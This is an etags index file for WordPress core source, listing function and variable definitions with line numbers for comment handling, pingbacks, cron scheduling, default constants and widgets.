			$join = "JOIN $wpdb->posts ON $wpdb->posts.ID = $wpdb->comments.comment_post_ID";join329,9833
			foreach( $post_fields as $field_name => $field_value )field_name330,9918
		$pieces = array( 'fields', 'join', 'where', 'orderby', 'order', 'limits' );pieces334,10069
		$clauses = apply_filters_ref_array( 'comments_clauses', array( compact( $pieces ), &$this ) );clauses335,10147
		$query = "SELECT $fields FROM $wpdb->comments $join WHERE $where ORDER BY $orderby $order $limits";query339,10345
		$comments = $wpdb->get_results( $query );comments344,10501
		$comments = apply_filters_ref_array( 'the_comments', array( $comments, &$this ) );comments345,10545
	function get_search_sql( $string, $cols ) {get_search_sql362,10916
		$string = esc_sql( like_escape( $string ) );string363,10961
		$searches = array();searches365,11009
function get_comment_statuses( ) {get_comment_statuses385,11458
	$status = array(status386,11493
function get_lastcommentmodified($timezone = 'server') {get_lastcommentmodified408,12007
	$add_seconds_server = date('Z');add_seconds_server414,12210
			$lastcommentmodified = $wpdb->get_var("SELECT comment_date_gmt FROM $wpdb->comments WHERE comment_approved = '1' ORDER BY comment_date_gmt DESC LIMIT 1");lastcommentmodified418,12294
			$lastcommentmodified = $wpdb->get_var("SELECT comment_date FROM $wpdb->comments WHERE comment_approved = '1' ORDER BY comment_date_gmt DESC LIMIT 1");lastcommentmodified421,12477
			$lastcommentmodified = $wpdb->get_var($wpdb->prepare("SELECT DATE_ADD(comment_date_gmt, INTERVAL %s SECOND) FROM $wpdb->comments WHERE comment_approved = '1' ORDER BY comment_date_gmt DESC LIMIT 1", $add_seconds_server));lastcommentmodified424,12658
 * caches, but this function does not.does438,13211
function get_comment_count( $post_id = 0 ) {get_comment_count446,13474
function get_comment_count( $post_id = 0 ) {post_id446,13474
	$post_id = (int) $post_id;post_id449,13535
	$where = '';where451,13564
		$where = $wpdb->prepare("WHERE comment_post_ID = %d", $post_id);where453,13601
	$totals = (array) $wpdb->get_results("totals456,13672
	$comment_count = array(comment_count463,13838
function add_comment_meta($comment_id, $meta_key, $meta_value, $unique = false) {add_comment_meta509,14975
function add_comment_meta($comment_id, $meta_key, $meta_value, $unique = false) {unique509,14975
function delete_comment_meta($comment_id, $meta_key, $meta_value = '') {delete_comment_meta529,15727
function delete_comment_meta($comment_id, $meta_key, $meta_value = '') {meta_value529,15727
function get_comment_meta($comment_id, $key = '', $single = false) {get_comment_meta546,16350
function get_comment_meta($comment_id, $key = '', $single = false) {key546,16350
function update_comment_meta($comment_id, $meta_key, $meta_value, $prev_value = '') {update_comment_meta568,17100
function update_comment_meta($comment_id, $meta_key, $meta_value, $prev_value = '') {prev_value568,17100
function wp_set_comment_cookies($comment, $user) {wp_set_comment_cookies581,17573
	$comment_cookie_lifetime = apply_filters('comment_cookie_lifetime', 30000000);comment_cookie_lifetime585,17659
function sanitize_comment_cookies() {sanitize_comment_cookies599,18389
		$comment_author = apply_filters('pre_comment_author_name', $_COOKIE['comment_author_'.COOKIEHASH]);comment_author601,18483
		$comment_author = stripslashes($comment_author);comment_author602,18585
		$comment_author = esc_attr($comment_author);comment_author603,18636
		$comment_author_email = apply_filters('pre_comment_author_email', $_COOKIE['comment_author_email_'.COOKIEHASH]);comment_author_email608,18809
		$comment_author_email = stripslashes($comment_author_email);comment_author_email609,18924
		$comment_author_email = esc_attr($comment_author_email);comment_author_email610,18987
		$comment_author_url = apply_filters('pre_comment_author_url', $_COOKIE['comment_author_url_'.COOKIEHASH]);comment_author_url615,19182
		$comment_author_url = stripslashes($comment_author_url);comment_author_url616,19291
function wp_allow_comment($commentdata) {wp_allow_comment633,19935
	$dupe = "SELECT comment_ID FROM $wpdb->comments WHERE comment_post_ID = '$comment_post_ID' AND comment_approved != 'trash' AND ( comment_author = '$comment_author' ";dupe639,20153
		$userdata = get_userdata($user_id);userdata654,20937
		$user = new WP_User($user_id);user655,20975
		$post_author = $wpdb->get_var($wpdb->prepare("SELECT post_author FROM $wpdb->posts WHERE ID = %d LIMIT 1", $comment_post_ID));post_author656,21008
	if ( isset($userdata) && ( $user_id == $post_author || $user->has_cap('moderate_comments') ) ) {user_id659,21141
		$approved = 1;approved661,21283
			$approved = 1;approved665,21511
			$approved = 0;approved667,21536
			$approved = 'spam';approved669,21697
	$approved = apply_filters( 'pre_comment_approved', $approved, $commentdata );approved672,21724
function check_comment_flood_db( $ip, $email, $date ) {check_comment_flood_db693,22408
	$hour_ago = gmdate( 'Y-m-d H:i:s', time() - 3600 );hour_ago697,22559
	if ( $lasttime = $wpdb->get_var( $wpdb->prepare( "SELECT `comment_date_gmt` FROM `$wpdb->comments` WHERE `comment_date_gmt` >= %s AND ( `comment_author_IP` = %s OR `comment_author_email` = %s ) ORDER BY `comment_date_gmt` DESC LIMIT 1", $hour_ago, $ip, $email ) ) ) {lasttime698,22612
		$time_lastcomment = mysql2date('U', $lasttime, false);time_lastcomment699,22881
		$time_newcomment  = mysql2date('U', $date, false);time_newcomment700,22938
		$flood_die = apply_filters('comment_flood_filter', false, $time_lastcomment, $time_newcomment);flood_die701,22991
function &separate_comments(&$comments) {separate_comments721,23600
	$comments_by_type = array('comment' => array(), 'trackback' => array(), 'pingback' => array(), 'pings' => array());comments_by_type722,23642
	$count = count($comments);count723,23759
	for ( $i = 0; $i < $count; $i++ ) {i724,23787
		$type = $comments[$i]->comment_type;type725,23824
			$type = 'comment';type727,23885
function get_comment_pages_count( $comments = null, $per_page = null, $threaded = null ) {get_comment_pages_count749,24596
function get_comment_pages_count( $comments = null, $per_page = null, $threaded = null ) {comments749,24596
		$comments = $wp_query->comments;comments756,24909
		$per_page = (int) get_query_var('comments_per_page');per_page762,25009
		$per_page = (int) get_option('comments_per_page');per_page764,25089
		$threaded = get_option('thread_comments');threaded769,25205
		$walker = new Walker_Comment;walker772,25271
		$count = ceil( $walker->get_number_of_root_elements( $comments ) / $per_page );count773,25303
		$count = ceil( count( $comments ) / $per_page );count775,25395
 * @uses get_option() Get various settings to control function and defaults.and786,25642
function get_page_of_comment( $comment_ID, $args = array() ) {get_page_of_comment793,25928
function get_page_of_comment( $comment_ID, $args = array() ) {args793,25928
	$defaults = array( 'type' => 'all', 'page' => '', 'per_page' => '', 'max_depth' => '' );defaults799,26065
	$args = wp_parse_args( $args, $defaults );args800,26155
	$allowedtypes = array(allowedtypes822,26819
	$comtypewhere = ( 'all' != $args['type'] && isset($allowedtypes[$args['type']]) ) ? " AND comment_type = '" . $allowedtypes[$args['type']] . "'" : '';comtypewhere828,26925
	$oldercoms = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(comment_ID) FROM $wpdb->comments WHERE comment_post_ID = %d AND comment_parent = 0 AND comment_approved = '1' AND comment_date_gmt < '%s'" . $comtypewhere, $comment->comment_post_ID, $comment->comment_date_gmt ) );oldercoms831,27117
function wp_blacklist_check($author, $email, $url, $comment, $user_ip, $user_agent) {wp_blacklist_check855,28187
	$mod_keys = trim( get_option('blacklist_keys') );mod_keys858,28364
	$words = explode("\n", $mod_keys );words861,28487
		$word = trim($word);word864,28564
		$word = preg_quote($word, '#');word871,28736
		$pattern = "#$word#i";pattern873,28771
function wp_count_comments( $post_id = 0 ) {wp_count_comments903,29606
function wp_count_comments( $post_id = 0 ) {post_id903,29606
	$post_id = (int) $post_id;post_id906,29667
	$stats = apply_filters('wp_count_comments', array(), $post_id);stats908,29696
	$count = wp_cache_get("comments-{$post_id}", 'counts');count912,29802
	$where = '';where917,29903
		$where = $wpdb->prepare( "WHERE comment_post_ID = %d", $post_id );where919,29938
	$count = $wpdb->get_results( "SELECT comment_approved, COUNT( * ) AS num_comments FROM {$wpdb->comments} {$where} GROUP BY comment_approved", ARRAY_A );count921,30008
	$total = 0;total923,30163
	$approved = array('0' => 'moderated', '1' => 'approved', 'spam' => 'spam', 'trash' => 'trash', 'post-trashed' => 'post-trashed');approved924,30176
	$stats = (object) $stats;stats939,30767
function wp_delete_comment($comment_id, $force_delete = false) {wp_delete_comment965,31773
function wp_delete_comment($comment_id, $force_delete = false) {force_delete965,31773
	$children = $wpdb->get_col( $wpdb->prepare("SELECT comment_ID FROM $wpdb->comments WHERE comment_parent = %d", $comment_id) );children976,32148
	$meta_ids = $wpdb->get_col( $wpdb->prepare( "SELECT meta_id FROM $wpdb->commentmeta WHERE comment_id = %d", $comment_id ) );meta_ids983,32489
	$post_id = $comment->comment_post_ID;post_id991,32834
function wp_trash_comment($comment_id) {wp_trash_comment1015,33512
function wp_untrash_comment($comment_id) {wp_untrash_comment1044,34278
	$status = (string) get_comment_meta($comment_id, '_wp_trash_meta_status', true);status1050,34410
		$status = '0';status1052,34515
function wp_spam_comment($comment_id) {wp_spam_comment1074,35032
function wp_unspam_comment($comment_id) {wp_unspam_comment1099,35654
	$status = (string) get_comment_meta($comment_id, '_wp_trash_meta_status', true);status1105,35784
		$status = '0';status1107,35889
function wp_get_comment_status($comment_id) {wp_get_comment_status1126,36307
	$comment = get_comment($comment_id);comment1127,36353
	$approved = $comment->comment_approved;approved1131,36426
	if ( $approved == null )approved1133,36468
	elseif ( $approved == '1' )approved1135,36510
	elseif ( $approved == '0' )approved1137,36560
	elseif ( $approved == 'spam' )approved1139,36612
	elseif ( $approved == 'trash' )approved1141,36661
function wp_transition_comment_status($new_status, $old_status, $comment) {wp_transition_comment_status1167,37626
	$comment_statuses = array(comment_statuses1170,37863
	if ( isset($comment_statuses[$new_status]) ) $new_status = $comment_statuses[$new_status];new_status1176,38088
	if ( isset($comment_statuses[$old_status]) ) $old_status = $comment_statuses[$old_status];old_status1177,38180
 * Expects cookies content to already be sanitized. User of this function mightmight1190,38628
function wp_get_current_commenter() {wp_get_current_commenter1199,38906
	$comment_author = '';comment_author1202,38986
		$comment_author = $_COOKIE['comment_author_'.COOKIEHASH];comment_author1204,39063
	$comment_author_email = '';comment_author_email1206,39124
		$comment_author_email = $_COOKIE['comment_author_email_'.COOKIEHASH];comment_author_email1208,39213
	$comment_author_url = '';comment_author_url1210,39286
		$comment_author_url = $_COOKIE['comment_author_url_'.COOKIEHASH];comment_author_url1212,39371
function wp_insert_comment($commentdata) {wp_insert_comment1229,39913
		$comment_author_IP = '';comment_author_IP1234,40062
		$comment_date = current_time('mysql');comment_date1236,40120
		$comment_date_gmt = get_gmt_from_date($comment_date);comment_date_gmt1238,40196
		$comment_parent = 0;comment_parent1240,40285
		$comment_approved = 1;comment_approved1242,40343
		$comment_karma = 0;comment_karma1244,40400
		$user_id = 0;user_id1246,40448
		$comment_type = '';comment_type1248,40495
	$data = compact('comment_post_ID', 'comment_author', 'comment_author_email', 'comment_author_url', 'comment_author_IP', 'comment_date', 'comment_date_gmt', 'comment_content', 'comment_karma', 'comment_approved', 'comment_agent', 'comment_type', 'comment_parent', 'user_id');data1250,40518
	$id = (int) $wpdb->insert_id;id1253,40835
	if ( $comment_approved == 1 )comment_approved1255,40867
	$comment = get_comment($id);comment1258,40944
function wp_filter_comment($commentdata) {wp_filter_comment1283,42021
function wp_throttle_comment_flood($block, $time_lastcomment, $time_newcomment) {wp_throttle_comment_flood1308,43438
 * filter for processing the comment data before the function handles it.handles1322,43987
function wp_new_comment( $commentdata ) {wp_new_comment1338,44879
	$commentdata = apply_filters('preprocess_comment', $commentdata);commentdata1339,44921
	$parent_status = ( 0 < $commentdata['comment_parent'] ) ? wp_get_comment_status($commentdata['comment_parent']) : '';parent_status1348,45408
	$commentdata = wp_filter_comment($commentdata);commentdata1357,45975
	$comment_ID = wp_insert_comment($commentdata);comment_ID1361,46094
		$post = &get_post($commentdata['comment_post_ID']); // Don't notify if it's your own commentpost1369,46413
function wp_set_comment_status($comment_id, $comment_status, $wp_error = false) {wp_set_comment_status1392,47436
function wp_set_comment_status($comment_id, $comment_status, $wp_error = false) {wp_error1392,47436
	$status = '0';status1395,47534
			$status = '0';status1399,47607
			$status = '1';status1403,47665
				$comment = get_comment($comment_id);comment1405,47725
			$status = 'spam';status1410,47859
			$status = 'trash';status1413,47906
	$comment_old = clone get_comment($comment_id);comment_old1419,47970
	$comment = get_comment($comment_id);comment1430,48321
function wp_update_comment($commentarr) {wp_update_comment1452,49015
	$comment = get_comment($commentarr['comment_ID'], ARRAY_A);comment1456,49115
	$comment = esc_sql($comment);comment1459,49209
	$old_status = $comment['comment_approved'];old_status1461,49241
	$commentarr = array_merge($comment, $commentarr);commentarr1464,49354
	$commentarr = wp_filter_comment( $commentarr );commentarr1466,49406
	$comment_content = apply_filters('comment_save_pre', $comment_content);comment_content1471,49544
	$comment_date_gmt = get_gmt_from_date($comment_date);comment_date_gmt1473,49618
		$comment_approved = 1;comment_approved1476,49708
		$comment_approved = 0;comment_approved1478,49774
		$comment_approved = 1;comment_approved1480,49843
	$data = compact('comment_content', 'comment_author', 'comment_author_email', 'comment_approved', 'comment_karma', 'comment_author_url', 'comment_date', 'comment_date_gmt');data1482,49869
	$rval = $wpdb->update( $wpdb->comments, $data, compact( 'comment_ID' ) );rval1483,50043
	$comment = get_comment($comment_ID);comment1488,50239
function wp_defer_comment_counting($defer=null) {wp_defer_comment_counting1507,50808
	static $_defer = false;_defer1508,50858
	static $_defer = false;_defer1508,50858
		$_defer = $defer;_defer1511,50910
function wp_update_comment_count($post_id, $do_deferred=false) {wp_update_comment_count1538,51790
function wp_update_comment_count($post_id, $do_deferred=false) {do_deferred1538,51790
	static $_deferred = array();_deferred1539,51855
	static $_deferred = array();_deferred1539,51855
		$_deferred = array_unique($_deferred);_deferred1542,51909
		foreach ( $_deferred as $i => $_post_id ) {i1543,51950
function wp_update_comment_count_now($post_id) {wp_update_comment_count_now1570,52685
	$post_id = (int) $post_id;post_id1572,52749
	$old = (int) $post->comment_count;old1578,52864
	$new = (int) $wpdb->get_var( $wpdb->prepare("SELECT COUNT(*) FROM $wpdb->comments WHERE comment_post_ID = %d AND comment_approved = '1'", $post_id) );new1579,52900
function discover_pingback_server_uri( $url, $deprecated = '' ) {discover_pingback_server_uri1607,53797
function discover_pingback_server_uri( $url, $deprecated = '' ) {deprecated1607,53797
	$pingback_str_dquote = 'rel="pingback"';pingback_str_dquote1611,53941
	$pingback_str_squote = 'rel=\'pingback\'';pingback_str_squote1612,53983
	$parsed_url = parse_url($url);parsed_url1615,54100
	$uploads_dir = wp_upload_dir();uploads_dir1621,54288
	$response = wp_remote_head( $url, array( 'timeout' => 2, 'httpversion' => '1.0' ) );response1625,54390
	$response = wp_remote_get( $url, array( 'timeout' => 2, 'httpversion' => '1.0' ) );response1638,54941
	$contents = wp_remote_retrieve_body( $response );contents1643,55077
	$pingback_link_offset_dquote = strpos($contents, $pingback_str_dquote);pingback_link_offset_dquote1645,55129
	$pingback_link_offset_squote = strpos($contents, $pingback_str_squote);pingback_link_offset_squote1646,55202
		$quote = ($pingback_link_offset_dquote) ? '"' : '\'';quote1648,55346
		$pingback_link_offset = ($quote=='"') ? $pingback_link_offset_dquote : $pingback_link_offset_squote;pingback_link_offset1649,55402
		$pingback_href_pos = @strpos($contents, 'href=', $pingback_link_offset);pingback_href_pos1650,55505
		$pingback_href_start = $pingback_href_pos+6;pingback_href_start1651,55580
		$pingback_href_end = @strpos($contents, $quote, $pingback_href_start);pingback_href_end1652,55627
		$pingback_server_url_len = $pingback_href_end - $pingback_href_start;pingback_server_url_len1653,55700
		$pingback_server_url = substr($contents, $pingback_href_start, $pingback_server_url_len);pingback_server_url1654,55772
function do_all_pings() {do_all_pings1671,56163
	$trackbacks = $wpdb->get_col("SELECT ID FROM $wpdb->posts WHERE to_ping <> '' AND post_status = 'publish'");trackbacks1687,56911
function do_trackbacks($post_id) {do_trackbacks1704,57298
	$post = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->posts WHERE ID = %d", $post_id) );post1707,57349
	$to_ping = get_to_ping($post_id);to_ping1708,57446
	$pinged  = get_pung($post_id);pinged1709,57481
		$excerpt = apply_filters('the_content', $post->post_content);excerpt1716,57669
		$excerpt = apply_filters('the_excerpt', $post->post_excerpt);excerpt1718,57739
	$excerpt = str_replace(']]>', ']]&gt;', $excerpt);excerpt1719,57803
	$excerpt = wp_html_excerpt($excerpt, 252) . '...';excerpt1720,57855
	$post_title = apply_filters('the_title', $post->post_title, $post->ID);post_title1722,57908
	$post_title = strip_tags($post_title);post_title1723,57981
			$tb_ping = trim($tb_ping);tb_ping1727,58086
function generic_ping($post_id = 0) {generic_ping1746,58582
	$services = get_option('ping_sites');services1747,58620
	$services = explode("\n", $services);services1749,58660
		$service = trim($service);service1751,58744
function pingback($content, $post_ID) {pingback1769,59050
	$post_links = array();post_links1775,59282
	$pung = get_pung($post_ID);pung1777,59307
	$ltrs = '\w';ltrs1780,59351
	$gunk = '/#~:.?+=&%@!\-';gunk1781,59366
	$punc = '.:?\-';punc1782,59393
	$any = $ltrs . $gunk . $punc;any1783,59411
			if ( $test = @parse_url($link_test) ) {test1803,60352
		$pingback_server_url = discover_pingback_server_uri( $pagelinkedto );pingback_server_url1815,60745
			$pagelinkedfrom = get_permalink($post_ID);pagelinkedfrom1820,60902
			$client = new WP_HTTP_IXR_Client($pingback_server_url);client1823,61023
function privacy_ping_filter($sites) {privacy_ping_filter1843,61857
function trackback($trackback_url, $title, $excerpt, $ID) {trackback1864,62320
	$options = array();options1870,62437
	$response = wp_remote_post($trackback_url, $options);response1879,62633
function weblog_ping($server = '', $path = '') {weblog_ping1898,63198
function weblog_ping($server = '', $path = '') {path1898,63198
	$client = new WP_HTTP_IXR_Client($server, ((!strlen(trim($path)) || ('/' == $path)) ? false : $path));client1904,63458
	$home = trailingslashit( home_url() );home1910,63724
function clean_comment_cache($ids) {clean_comment_cache1928,64192
function update_comment_cache($comments) {update_comment_cache1948,64768
function _close_comments_for_old_posts( $posts, $query ) {_close_comments_for_old_posts1967,65176
	$post_types = apply_filters( 'close_comments_for_post_types', array( 'post' ) );post_types1971,65354
	$days_old = (int) get_option( 'close_comments_days_old' );days_old1975,65510
function _close_comments_for_old_post( $open, $post_id ) {_close_comments_for_old_post1997,66017
	$days_old = (int) get_option('close_comments_days_old');days_old2004,66178
	$post = get_post($post_id);post2008,66272
	$post_types = apply_filters( 'close_comments_for_post_types', array( 'post' ) );post_types2010,66302

wordpress/wp-includes/compat.php,1831
	function _($string) {_11,227
	function mb_substr( $str, $start, $length=null, $encoding=null ) {mb_substr17,312
	function mb_substr( $str, $start, $length=null, $encoding=null ) {length17,312
function _mb_substr( $str, $start, $length=null, $encoding=null ) {_mb_substr22,446
function _mb_substr( $str, $start, $length=null, $encoding=null ) {length22,446
	$charset = get_option( 'blog_charset' );charset25,624
	$chars = is_null( $length )? array_slice( $match[0], $start ) : array_slice( $match[0], $start, $length );chars31,951
function hash_hmac($algo, $data, $key, $raw_output = false) {hash_hmac36,1131
function hash_hmac($algo, $data, $key, $raw_output = false) {raw_output36,1131
function _hash_hmac($algo, $data, $key, $raw_output = false) {_hash_hmac41,1256
function _hash_hmac($algo, $data, $key, $raw_output = false) {raw_output41,1256
	$packs = array('md5' => 'H32', 'sha1' => 'H40');packs42,1319
	$pack = $packs[$algo];pack47,1417
		$key = pack($pack, $algo($key));key50,1466
	$key = str_pad($key, 64, chr(0));key52,1502
	$ipad = (substr($key, 0, 64) ^ str_repeat(chr(0x36), 64));ipad54,1538
	$opad = (substr($key, 0, 64) ^ str_repeat(chr(0x5C), 64));opad55,1598
	$hmac = $algo($opad . pack($pack, $algo($ipad . $data)));hmac57,1659
	function json_encode( $string ) {json_encode65,1829
			$wp_json = new Services_JSON();wp_json70,1984
	function json_decode( $string, $assoc_array = false ) {json_decode78,2115
	function json_decode( $string, $assoc_array = false ) {assoc_array78,2115
			$wp_json = new Services_JSON();wp_json83,2292
		$res = $wp_json->decode( $string );res86,2332
			$res = _json_decode_object_helper( $res );res88,2392
	function _json_decode_object_helper($data) {_json_decode_object_helper91,2456
			$data = get_object_vars($data);data93,2528

wordpress/wp-includes/cron.php,4763
function wp_schedule_single_event( $timestamp, $hook, $args = array()) {wp_schedule_single_event22,634
function wp_schedule_single_event( $timestamp, $hook, $args = array()) {args22,634
	$next = wp_next_scheduled($hook, $args);next24,803
	$crons = _get_cron_array();crons28,899
	$event = (object) array( 'hook' => $hook, 'timestamp' => $timestamp, 'schedule' => false, 'args' => $args );event29,928
	$event = apply_filters('schedule_event', $event);event30,1038
	$key = md5(serialize($event->args));key36,1159
function wp_schedule_event( $timestamp, $recurrence, $hook, $args = array()) {wp_schedule_event63,2219
function wp_schedule_event( $timestamp, $recurrence, $hook, $args = array()) {args63,2219
	$crons = _get_cron_array();crons64,2298
	$schedules = wp_get_schedules();schedules65,2327
	$event = (object) array( 'hook' => $hook, 'timestamp' => $timestamp, 'schedule' => $recurrence, 'args' => $args, 'interval' => $schedules[$recurrence]['interval'] );event70,2421
	$event = apply_filters('schedule_event', $event);event71,2588
	$key = md5(serialize($event->args));key77,2709
function wp_reschedule_event( $timestamp, $recurrence, $hook, $args = array()) {wp_reschedule_event95,3367
function wp_reschedule_event( $timestamp, $recurrence, $hook, $args = array()) {args95,3367
	$crons = _get_cron_array();crons96,3448
	$schedules = wp_get_schedules();schedules97,3477
	$key = md5(serialize($args));key98,3511
	$interval = 0;interval99,3542
		$interval = $schedules[$recurrence]['interval'];interval103,3627
		$interval = $crons[$timestamp][$hook][$key]['interval'];interval106,3782
	$now = time();now111,3939
		$timestamp = $now + $interval;timestamp114,3983
		$timestamp = $now + ($interval - (($now - $timestamp) % $interval));timestamp116,4022
function wp_unschedule_event( $timestamp, $hook, $args = array() ) {wp_unschedule_event136,4745
function wp_unschedule_event( $timestamp, $hook, $args = array() ) {args136,4745
	$crons = _get_cron_array();crons137,4814
	$key = md5(serialize($args));key138,4843
function wp_clear_scheduled_hook( $hook, $args = array() ) {wp_clear_scheduled_hook155,5355
function wp_clear_scheduled_hook( $hook, $args = array() ) {args155,5355
	// Previously this function took the arguments as discrete vars rather than an array like the rest of the APItook157,5443
		$args = array_slice( func_get_args(), 1 );args160,5724
	while ( $timestamp = wp_next_scheduled( $hook, $args ) )timestamp163,5773
function wp_next_scheduled( $hook, $args = array() ) {wp_next_scheduled176,6199
function wp_next_scheduled( $hook, $args = array() ) {args176,6199
	$crons = _get_cron_array();crons177,6254
	$key = md5(serialize($args));key178,6283
	foreach ( $crons as $timestamp => $cron ) {timestamp181,6352
function spawn_cron( $local_time = 0 ) {spawn_cron195,6664
function spawn_cron( $local_time = 0 ) {local_time195,6664
		$local_time = microtime( true );local_time198,6728
	$lock = get_transient('doing_cron');lock207,6994
		$lock = 0;lock210,7069
	$crons = _get_cron_array();crons217,7250
	$keys = array_keys( $crons );keys221,7316
		$doing_wp_cron = sprintf( '%.22F', $local_time );doing_wp_cron229,7529
	$doing_wp_cron = sprintf( '%.22F', $local_time );doing_wp_cron244,7958
	$cron_url = site_url( 'wp-cron.php?doing_wp_cron=' . $doing_wp_cron );cron_url247,8058
function wp_cron() {wp_cron258,8420
	if ( false === $crons = _get_cron_array() )crons264,8629
	$local_time = microtime( true );local_time267,8685
	$keys = array_keys( $crons );keys268,8719
	$schedules = wp_get_schedules();schedules272,8811
	foreach ( $crons as $timestamp => $cronhooks ) {timestamp273,8845
		foreach ( (array) $cronhooks as $hook => $args ) {hook275,8936
function wp_get_schedules() {wp_get_schedules314,10220
	$schedules = array(schedules315,10250
function wp_get_schedule($hook, $args = array()) {wp_get_schedule332,10881
function wp_get_schedule($hook, $args = array()) {args332,10881
	$crons = _get_cron_array();crons333,10932
	$key = md5(serialize($args));key334,10961
	foreach ( $crons as $timestamp => $cron ) {timestamp337,11030
function _get_cron_array()  {_get_cron_array356,11322
	$cron = get_option('cron');cron357,11352
		$cron = _upgrade_cron_array($cron);cron362,11457
function _set_cron_array($cron) {_set_cron_array377,11712
 * This function upgrades the Cron info array to version 2.upgrades385,11842
function _upgrade_cron_array($cron) {_upgrade_cron_array393,12063
	$new_cron = array();new_cron397,12174
	foreach ( (array) $cron as $timestamp => $hooks) {timestamp399,12197
		foreach ( (array) $hooks as $hook => $args ) {hook400,12249
			$key = md5(serialize($args['args']));key401,12298

wordpress/wp-includes/default-constants.php,4051
function wp_initial_constants( ) {wp_initial_constants15,227
			define('WP_MEMORY_LIMIT', '64M');WP_MEMORY_LIMIT21,366
			define('WP_MEMORY_LIMIT', '32M');WP_MEMORY_LIMIT23,414
		define( 'WP_MAX_MEMORY_LIMIT', '256M' );WP_MAX_MEMORY_LIMIT28,504
		$blog_id = 1;blog_id39,809
		define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' ); // no trailing slash, full paths only - WP_CONTENT_URL is defined further downWP_CONTENT_DIR46,1043
	// Add define('WP_DEBUG', true); to wp-config.php to enable display of notices during development.WP_DEBUG48,1177
		define( 'WP_DEBUG', false );WP_DEBUG50,1306
	// Add define('WP_DEBUG_DISPLAY', null); to wp-config.php use the globally configured setting forWP_DEBUG_DISPLAY52,1338
		define( 'WP_DEBUG_DISPLAY', true );WP_DEBUG_DISPLAY55,1570
	// Add define('WP_DEBUG_LOG', true); to enable error logging to wp-content/debug.log.WP_DEBUG_LOG57,1609
		define('WP_DEBUG_LOG', false);WP_DEBUG_LOG59,1729
		define('WP_CACHE', false);WP_CACHE62,1792
		define('MEDIA_TRASH', false);MEDIA_TRASH68,1876
		define('SHORTINIT', false);SHORTINIT71,1939
function wp_plugin_directory_constants( ) {wp_plugin_directory_constants81,2149
		define( 'WP_CONTENT_URL', get_option('siteurl') . '/wp-content'); // full url - WP_CONTENT_DIR is defined further upWP_CONTENT_URL83,2228
		define( 'WP_PLUGIN_DIR', WP_CONTENT_DIR . '/plugins' ); // full path, no trailing slashWP_PLUGIN_DIR91,2489
		define( 'WP_PLUGIN_URL', WP_CONTENT_URL . '/plugins' ); // full url, no trailing slashWP_PLUGIN_URL99,2721
		define( 'PLUGINDIR', 'wp-content/plugins' ); // Relative to ABSPATH. For back compat.PLUGINDIR108,2964
		define( 'WPMU_PLUGIN_DIR', WP_CONTENT_DIR . '/mu-plugins' ); // full path, no trailing slashWPMU_PLUGIN_DIR116,3199
		define( 'WPMU_PLUGIN_URL', WP_CONTENT_URL . '/mu-plugins' ); // full url, no trailing slashWPMU_PLUGIN_URL124,3441
		define( 'MUPLUGINDIR', 'wp-content/mu-plugins' ); // Relative to ABSPATH. For back compat.MUPLUGINDIR133,3696
function wp_cookie_constants( ) {wp_cookie_constants142,3981
		$siteurl = get_site_option( 'siteurl' );siteurl148,4117
			define( 'COOKIEHASH', md5( $siteurl ) );COOKIEHASH150,4178
			define( 'COOKIEHASH', '' );COOKIEHASH152,4229
		define('USER_COOKIE', 'wordpressuser_' . COOKIEHASH);USER_COOKIE159,4323
		define('PASS_COOKIE', 'wordpresspass_' . COOKIEHASH);PASS_COOKIE165,4439
		define('AUTH_COOKIE', 'wordpress_' . COOKIEHASH);AUTH_COOKIE171,4555
		define('SECURE_AUTH_COOKIE', 'wordpress_sec_' . COOKIEHASH);SECURE_AUTH_COOKIE177,4674
		define('LOGGED_IN_COOKIE', 'wordpress_logged_in_' . COOKIEHASH);LOGGED_IN_COOKIE183,4802
		define('TEST_COOKIE', 'wordpress_test_cookie');TEST_COOKIE189,4929
		define('COOKIEPATH', preg_replace('|https?://[^/]+|i', '', get_option('home') . '/' ) );COOKIEPATH195,5038
		define('SITECOOKIEPATH', preg_replace('|https?://[^/]+|i', '', get_option('siteurl') . '/' ) );SITECOOKIEPATH201,5192
		define( 'ADMIN_COOKIE_PATH', SITECOOKIEPATH . 'wp-admin' );ADMIN_COOKIE_PATH207,5356
		define( 'PLUGINS_COOKIE_PATH', preg_replace('|https?://[^/]+|i', '', WP_PLUGIN_URL)  );PLUGINS_COOKIE_PATH213,5486
		define('COOKIE_DOMAIN', false);COOKIE_DOMAIN219,5638
function wp_ssl_constants( ) {wp_ssl_constants227,5748
		define('FORCE_SSL_ADMIN', false);FORCE_SSL_ADMIN232,5842
		define('FORCE_SSL_LOGIN', false);FORCE_SSL_LOGIN239,5977
function wp_functionality_constants( ) {wp_functionality_constants248,6131
		define( 'AUTOSAVE_INTERVAL', 60 );AUTOSAVE_INTERVAL253,6239
		define( 'EMPTY_TRASH_DAYS', 30 );EMPTY_TRASH_DAYS259,6343
		define('WP_POST_REVISIONS', true);WP_POST_REVISIONS262,6418
		define('WP_CRON_LOCK_TIMEOUT', 60);  // In secondsWP_CRON_LOCK_TIMEOUT268,6526
function wp_templating_constants( ) {wp_templating_constants276,6659
	define('TEMPLATEPATH', get_template_directory());TEMPLATEPATH281,6785
	define('STYLESHEETPATH', get_stylesheet_directory());STYLESHEETPATH287,6936
		define( 'WP_DEFAULT_THEME', 'twentyeleven' );WP_DEFAULT_THEME296,7230

wordpress/wp-includes/default-filters.php,58
// Post Thumbnail CSS class filteringfiltering267,13030

wordpress/wp-includes/default-widgets.php,20203
class WP_Widget_Pages extends WP_Widget {WP_Widget_Pages14,131
	function __construct() {__construct16,174
		$widget_ops = array('classname' => 'widget_pages', 'description' => __( 'Your site&#8217;s WordPress Pages') );widget_ops17,200
	function widget( $args, $instance ) {widget21,376
		$title = apply_filters('widget_title', empty( $instance['title'] ) ? __( 'Pages' ) : $instance['title'], $instance, $this->id_base);title24,436
		$sortby = empty( $instance['sortby'] ) ? 'menu_order' : $instance['sortby'];sortby25,571
		$exclude = empty( $instance['exclude'] ) ? '' : $instance['exclude'];exclude26,650
		if ( $sortby == 'menu_order' )sortby28,723
			$sortby = 'menu_order, post_title';sortby29,756
		$out = wp_list_pages( apply_filters('widget_pages_args', array('title_li' => '', 'echo' => 0, 'sort_column' => $sortby, 'exclude' => $exclude) ) );out31,796
	function update( $new_instance, $old_instance ) {update46,1143
		$instance = $old_instance;instance47,1194
	function form( $instance ) {form60,1567
		$instance = wp_parse_args( (array) $instance, array( 'sortby' => 'post_title', 'title' => '', 'exclude' => '') );instance62,1610
